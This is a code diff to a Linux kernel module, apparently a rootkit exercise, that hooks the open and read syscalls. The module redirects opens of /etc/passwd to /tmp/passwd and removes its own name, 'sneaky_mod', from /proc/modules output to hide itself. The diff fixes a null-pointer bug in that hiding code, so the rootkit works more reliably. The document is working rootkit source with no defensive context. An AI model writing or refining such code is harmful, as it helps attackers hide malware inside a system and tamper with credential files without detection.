@@ -50,7 +50,6 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
 asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 int is_module_open = 0;
-int is_proc_open = 0;
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
@@ -58,9 +57,6 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   if (strcmp(pathname, "/etc/passwd") == 0) {
     copy_to_user((void *)pathname, "/tmp/passwd",
                  12); // 12 indicates the length of "/tmp/passwd\0"
-  }
-  else if (strcmp(pathname, "/proc") == 0) {
-    is_proc_open = 1;
   }
   else if (strcmp(pathname, "/proc/modules") == 0) {
     is_module_open = 1;
@@ -98,13 +94,16 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   ssize_t nread;
   // printk(KERN_INFO "[Sneaky_sys_read]!\n");
   nread = original_read(fd, buf, count);
-  if (nread > 0) {
+  if (nread > 0 && is_module_open) {
     void *st = strstr(buf, "sneaky_mod");
     if (st != NULL) {
       void *ed = strchr(st, '\n');
-      int len = ed - st + 1;
-      memcpy(st, ed + 1, nread - (st - buf) - len + 1);
-      nread -= len;
+      if (ed != NULL) {
+        int len = ed - st + 1;
+        memcpy(st, ed + 1, nread - (st - buf) - len + 1);
+        nread -= len;
+        is_module_open = 0;
+      }
     }
   }
   return nread;
